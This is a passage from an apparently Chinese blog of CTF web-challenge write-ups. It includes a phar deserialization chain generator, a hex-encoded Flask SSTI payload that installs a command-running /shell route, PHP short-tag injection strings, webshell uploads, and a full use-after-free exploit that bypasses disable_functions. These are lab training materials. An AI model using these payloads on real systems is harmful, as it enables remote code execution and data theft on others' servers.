show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123;     $show-&gt;source &#x3D; $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>upload_file.php</p><pre class="language-none"><code class="language-none">&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;     &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt;     &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;     &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename);     echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension &#x3D; end($temp);     if(empty($extension)) &#123;         &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125204709437.png" alt="image-20211125204709437"></p><p>肯定是用这个函数来读取flag文件，但是没有反序列化的地方</p><p>加个新知识</p><p><strong>利用phar协议实现反序列化漏洞攻击</strong></p><p><strong>漏洞成因</strong> </p><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><p>原理分析 </p><p>phar的组成</p><p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p><p>1 .0  a stub</p><p>标识作用，格式为</p><pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre><p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>2 .0 </p><p>a manifest describing the contents</p><p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p><p>3 .0 the file contents</p><p>这里指的是被压缩文件的内容；</p><p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p><p>签名，放在结尾；</p><p><strong>C1e4r类中有__destruct(),</strong></p><p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。</p><p>函数中发现了echo，那么要利用echo $this-&gt;test。</p><p><strong>show类有__toString(),</strong></p><p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。</p><p>利用$this-&gt;str[&#39;str&#39;]-&gt;source;</p><p><strong>Test类有__get（）</strong></p><p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p><p>利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p><p>利用C1e4r类的<code>__destruct()</code>中的echo this-&gt;test<br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>this-&gt;test2.触发Show类的</code>__toString()<code>3.利用Show类的</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.触发Test类的</code>__get()<code>5.成功利用</code>file_get()`读文件</p><p>反序列化结果</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a &#x3D; new C1e4r();$b &#x3D; new Show();$c &#x3D; new Test();$a -&gt;str &#x3D; $b;$b -&gt;str[&#39;str&#39;] &#x3D; $c;$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的$phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名$phar-&gt;stopBuffering();?&gt;</code></pre><p>生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235333537.png" alt="image-20211125235333537"></p><p>看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235401120.png" alt="image-20211125235401120"></p><p>得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235433599.png" alt="image-20211125235433599"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200049514.png" alt="image-20211129200049514"></p><p>source</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword &#x3D; [    &#x2F;&#x2F; no path traversal    &#39;\.\.&#39;,    &#x2F;&#x2F; no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    &#x2F;&#x2F; no data exfiltration    &#39;flag&#39;  ];  $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据$json &#x3D; json_decode($body, true); #对body变量进行json解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page  $page &#x3D; $json[&#39;page&#39;];  $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件  if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过    $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\n&quot;;  &#125;&#125; else &#123;  $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;;&#125;&#x2F;&#x2F; no data exfiltration!!!$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203949145.png" alt="image-20211129203949145"></p><p>通过更改头像传个马上去，蚁剑连接就行</p><p>这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129204113745.png" alt="image-20211129204113745"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203758946.png" alt="image-20211129203758946"></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>ssti注入，用使用工具Arjun进行参数爆破</p><p>然后找到name参数后，拿出珍藏的写入shell的payload</p><p><a href="https://xz.aliyun.com/t/9008">ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com)</a></p><pre class="language-none"><code class="language-none">&#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x0a\x0a\x40\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x2e\x72\x6f\x75\x74\x65\x28\x27\x2f\x73\x68\x65\x6c\x6c\x27\x2c\x6d\x65\x74\x68\x6f\x64\x73\x3d\x5b\x27\x47\x45\x54\x27\x2c\x27\x50\x4f\x53\x54\x27\x5d\x29\x0a\x64\x65\x66\x20\x73\x68\x65\x6c\x6c\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x20\x20\x20\x20\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x0a\x20\x20\x20\x20\x63\x6d\x64\x3d\x72\x65\x71\x75\x65\x73\x74\x2e\x61\x72\x67\x73\x2e\x67\x65\x74\x28\x27\x63\x6d\x64\x27\x29\x0a\x20\x20\x20\x20\x72\x74\x3d\x6f\x73\x2e\x70\x6f\x70\x65\x6e\x28\x63\x6d\x64\x29\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x74&#39;) %&#125;&#123;% endif%&#125;其中的16进制编码了原始代码   </code></pre><p>即</p><pre class="language-none"><code class="language-none">from flask import current_app@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def shell():    import os    from flask import request    cmd&#x3D;request.args.get(&#39;cmd&#39;)    rt&#x3D;os.popen(cmd).read()    return rt</code></pre><p>写入</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213039549.png" alt="image-20211130213039549"></p><p>然后直接写入命令</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213128899.png" alt="image-20211130213128899"></p><p>可能会出现not found的报错，多试几次</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213228889.png" alt="image-20211130213228889"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215102048.png" alt="image-20211202215102048"></p><p>有/secret目录，扫一下或者猜出来</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215126891.png" alt="image-20211202215126891"></p><p>arjun扫一下是否有传参</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215226926.png" alt="image-20211202215226926"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215244403.png" alt="image-20211202215244403"></p><p>当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215324285.png" alt="image-20211202215324285"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215336677.png" alt="image-20211202215336677"></p><p>采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215541398.png" alt="image-20211202215541398"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215555418.png" alt="image-20211202215555418"></p><p>能找到根目录下的flag.txt</p><p>cat读取</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215700231.png" alt="image-20211202215700231"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215712160.png" alt="image-20211202215712160"></p><p>这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215826313.png" alt="image-20211202215826313"></p><p><a href="https://www.sohu.com/a/370378373_750628">从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com)</a></p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;        &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key&#x3D;&gt;$output)&#123;          $input[$key] &#x3D; waf($output);      &#125;  &#125;else&#123;      $input &#x3D; check($input);  &#125;&#125;$dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\t</p><pre class="language-none"><code class="language-none">PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。</code></pre><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;flllllll1112222222lag&#96;?&gt;或者?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;f*&#96;?&gt;*为通配符</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206211136986.png" alt="image-20211206211136986"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>题目时thinkphp6版本的漏洞</p><p><a href="https://ld246.com/article/1579965339516">ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com)</a></p><p>只需要构造 PHPSESSID 的值即可，值为 <code>string</code>&amp;&amp;长度为 32</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="tp.png"></p><p>此时查看一下生成的 session，生成的 session 文件保存在 <code>\runtime\session</code> 下</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="sessionphp.png"></p><p>session 里的内容:</p><pre class="language-json" data-language="json"><code class="language-json">a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125;</code></pre><p>可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell</p><hr><p>这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205225749.png" alt="image-20211208205225749"></p><p>所以我们可以修改session为.php的后缀，然后</p><p>在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马</p><p>先试试phpinfo</p><p>/runtime/session/sess_0123456789012345678901234568.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208203421218.png" alt="image-20211208203421218"></p><p>写个一句话木马</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205558736.png" alt="image-20211208205558736"></p><p>蚁剑连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205849571.png" alt="image-20211208205849571"></p><p>根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容</p><p>但是在虚拟终端无法执行命令</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210015627.png" alt="image-20211208210015627"></p><p>结合phpinfo里的禁用函数</p><p>能得出这是个突破disable_function限制执行命令的考点</p><p>之前[极客大挑战 2019]RCE ME也有这个考点（往上翻</p><p>但是在这道题里用蚁剑的插件没法绕过</p><p>上个exp（羡慕能写出这种exp的大师傅</p><pre class="language-none"><code class="language-none">&lt;?phppwn(&quot;&#x2F;readflag&quot;);function pwn($cmd)&#123;    global $abc, $helper, $backtrace;    class Vuln    &#123;        public $a;        public function __destruct()        &#123;            global $backtrace;            unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper    &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8)    &#123;        $address &#x3D; 0;        for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p + $j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8)    &#123;        $out &#x3D; &quot;&quot;;        for ($i &#x3D; 0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8)    &#123;        $i &#x3D; 0;        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8)    &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if ($s !&#x3D; 8) &#123;            $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1;        &#125;        return $leak;    &#125;    function parse_elf($base)    &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if (!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf)    &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if ($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if ($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak)    &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs)    &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while ($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg)    &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if (stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for ($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123;    &#125;;    if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if (!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if (!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if (!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;</code></pre><p>把这个php文件找个地方传上去</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210715741.png" alt="image-20211208210715741"></p><p>访问这个路径，得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210736589.png" alt="image-20211208210736589"></p><h2 id="BJDCTF2020-EzPHP"><a 